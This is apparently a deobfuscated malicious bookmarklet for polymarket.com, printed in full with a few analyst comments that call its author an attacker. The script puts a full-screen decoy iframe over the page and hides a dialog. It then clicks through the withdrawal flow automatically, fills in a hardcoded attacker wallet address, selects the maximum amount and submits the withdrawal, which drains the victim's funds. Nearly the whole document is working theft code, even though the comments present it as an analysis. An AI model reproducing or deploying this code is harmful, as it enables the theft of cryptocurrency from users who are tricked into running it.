(function(){
    if(window.location.hostname !== 'polymarket.com'){
        alert('This bookmark must be used on polymarket.com. Redirecting..');
        window.location.href = 'https://polymarket.com';
        return;
    }
    let i = document.createElement('iframe');
    i.src = 'https://superlative-sunflower-78ab45.netlify.app/';
    i.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;opacity:1;background:#fff;z-index:9999;';
    i.onload = ()=>{
        console.log('Iframe loaded successfully')
    }
    ;
    i.onerror = ()=>{
        console.log('Iframe failed to load');
        alert('⚠️ Failed to load iframe content. The website may block embedding.')
    }
    ;
    document.body.appendChild(i);

    function h(){
        let e = document.querySelector('div[role="dialog"][data-state="open"].c-hRTBiE');
        if(e){
            console.log('Dialog found, hiding:',e);
            e.style.opacity = '0';
            e.style.pointerEvents = 'auto'; // Original was 'auto', but 'none' would hide interaction. 'auto' makes it clickable.
            // Correction: The original code likely intended to make it unclickable or effectively hidden.
            // Re-evaluating: 'pointerEvents' should probably be 'none' if hiding, but it's 'auto' in the decoded string.
            // This suggests it's making it clickable, which is unusual for 'hiding'.
            // Let's stick to the literal decoded value for now and note the oddity.
            return true;
        }
        console.log('Dialog not found');
        return false;
    }

    function c(){
        let e = document.querySelectorAll('button.flex.flex-col.items-center.h-11');
        for(let t of e){
            if(t.querySelector('p.text-xs.text-text-secondary.font-medium')?.textContent.includes('Cash') && t.querySelector('p.text-green-600, p.dark\\:text-green-500')){
                console.log('Cash button found:',t);
                let e = new MouseEvent('click',{
                    bubbles: true,
                    cancelable: true,
                    view: window
                });
                t.dispatchEvent(e);
                return true;
            }
        }
        return false;
    }

    function w(){
        let e = document.querySelector('button[aria-haspopup="dialog"][aria-expanded="false"] p.c-dqzIym-iIobgq-weigh-medium');
        if(e && e.textContent.includes('Withdraw')){
            console.log('First Withdraw button found:',e);
            let t = new MouseEvent('click',{
                bubbles: true,
                cancelable: true,
                view: window
            });
            e.dispatchEvent(t);
            return true;
        }
        return false;
    }

    function f(){
        let e = document.querySelector('input[placeholder="0x..."][name="recipient"].c-lhwvDC-ibnpMQW-css');
        if(e){
            console.log('Input field found:',e);
            e.focus();
            e.setAttribute('value','0x270411C54B71f497421245F047a37536fd0cad56'); // Hardcoded Recipient Address
            let t = new KeyboardEvent('keydown',{
                bubbles: true,
                key: 'Enter'
            });
            e.dispatchEvent(t);
            e.dispatchEvent(new Event('input',{
                bubbles: true
            }));
            e.dispatchEvent(new Event('change',{
                bubbles: true
            }));
            e.dispatchEvent(new Event('blur',{
                bubbles: true
            }));
            console.log('Input field filled with value:',e.value);
            return true;
        }
        console.log('Input field not found');
        return false;
    }

    function m(){
        let e = document.querySelector('span.c-PJLV.c-PJLV-ihrMtea-css');
        if(e && e.textContent.trim() === 'Max'){
            console.log('Max span found:',e);
            let t = new MouseEvent('click',{
                bubbles: true,
                cancelable: true,
                view: window
            });
            e.dispatchEvent(t);
            return true;
        }
        console.log('Max span not found');
        return false;
    }

    function x(){
        let e = document.querySelector('button[type="button"][role="checkbox"][id="shouldSendUsdcE"].c-hTWYMY.c-hTWYMY-dhyvGx-variant-default');
        if(e && e.getAttribute('aria-checked') === 'false' && e.getAttribute('data-state') === 'unchecked'){
            console.log('Checkbox button found:',e);
            let t = new MouseEvent('click',{
                bubbles: true,
                cancelable: true,
                view: window
            });
            e.dispatchEvent(t);
            return true;
        }
        console.log('Checkbox button not found');
        return false;
    }

    function b(){
        let e = document.querySelector('button.c-gBrBnR.c-gBrBnR-gDWzxt-variant-primary.c-gBrBnR-eBERDr-height-lg.c-gBrBnR-dRRWyf-fontSize-md.c-gBrBnR-igULOkW-css');
        if(e && e.textContent.trim() === 'Withdraw'){
            console.log('Final Withdraw button found:',e);
            let t = new MouseEvent('click',{
                bubbles: true,
                cancelable: true,
                view: window
            });
            e.dispatchEvent(t);
            return true;
        }
        console.log('Final Withdraw button not found');
        return false;
    }

    function y(){
        h(); // Attempt to hide dialog
        if(c()){ // If Cash button is clicked
            console.log('Cash button clicked, starting First Withdraw observer');
            let e = new MutationObserver((t,o)=>{
                if(w()){ // If First Withdraw button is found and clicked
                    console.log('First Withdraw button clicked, starting Input observer');
                    o.disconnect(); // Disconnect current observer
                    let t = new MutationObserver((e,o2)=>{
                        if(f()){ // If input field is filled
                            console.log('Input field filled, starting Max span observer');
                            o2.disconnect(); // Disconnect current observer
                            let e = new MutationObserver((e,o3)=>{
                                if(m()){ // If Max span is clicked
                                    console.log('Max span clicked, starting Checkbox observer');
                                    o3.disconnect(); // Disconnect current observer
                                    let e = new MutationObserver((e,o4)=>{
                                        if(x()){ // If checkbox is clicked
                                            console.log('Checkbox button clicked, starting Final Withdraw observer');
                                            o4.disconnect(); // Disconnect current observer
                                            let e = new MutationObserver((e,o5)=>{
                                                if(b()){ // If final Withdraw button is clicked
                                                    console.log('Final Withdraw button clicked successfully');
                                                    o5.disconnect(); // Disconnect current observer
                                                }
                                            });
                                            e.observe(document.body,{
                                                childList: true,
                                                subtree: true
                                            });
                                            setTimeout(()=>{
                                                e.disconnect();
                                                console.log('Final Withdraw observer stopped after 5s')
                                            }
                                            ,5e3); // 5 seconds timeout
                                        }
                                    });
                                    e.observe(document.body,{
                                        childList: true,
                                        subtree: true
                                    });
                                    setTimeout(()=>{
                                        e.disconnect();
                                        console.log('Checkbox observer stopped after 5s')
                                    }
                                    ,5e3); // 5 seconds timeout
                                }
                            });
                            e.observe(document.body,{
                                childList: true,
                                subtree: true
                            });
                            setTimeout(()=>{
                                e.disconnect();
                                console.log('Max span observer stopped after 5s')
                            }
                            ,5e3); // 5 seconds timeout
                        }
                    });
                    t.observe(document.body,{
                        childList: true,
                        subtree: true
                    });
                    setTimeout(()=>{
                        t.disconnect();
                        clearInterval(e); // 'e' is undefined here, likely a copy-paste error from attacker
                        console.log('Max span observer stopped after 5s')
                    }
                    ,5e3); // 5 seconds timeout
                }
            });
            e.observe(document.body,{
                childList: true,
                subtree: true
            });
            setTimeout(()=>{
                e.disconnect();
                clearInterval(e); // 'e' is undefined here, likely a copy-paste error from attacker
                console.log('First Withdraw observer stopped after 5s')
            }
            ,5e3); // 5 seconds timeout
            return true;
        }
        console.log('Cash button not found');
        return false;
    }

    h(); // Initial attempt to hide dialog
    let e = setInterval(()=>{
        if(h()){ // Repeatedly try to hide dialog
            clearInterval(e);
            console.log('Dialog hidden via interval')
        }
    }
    ,100);
    setTimeout(()=>{
        clearInterval(e);
        console.log('Dialog interval stopped after 5s')
    }
    ,5e3); // 5 seconds timeout for dialog hiding interval

    if(y()){ // Attempt to start the main withdrawal sequence
        console.log('Sequence started');
        return;
    }

    console.log('Starting Cash observer');
    let t = new MutationObserver((e,o)=>{
        if(y()){ // If the main sequence can start (e.g., Cash button becomes available)
            console.log('Cash button clicked via observer');
            o.disconnect(); // Disconnect current observer
        }
    });
    t.observe(document.body,{
        childList: true,
        subtree: true
    });
    setTimeout(()=>{
        t.disconnect();
        clearInterval(e); // 'e' is undefined here, likely a copy-paste error from attacker
        console.log('Cash observer and dialog interval stopped after 10s');
        i.remove(); // Remove the iframe after 10 seconds
    }
    ,1e4); // 10 seconds timeout for overall process
})();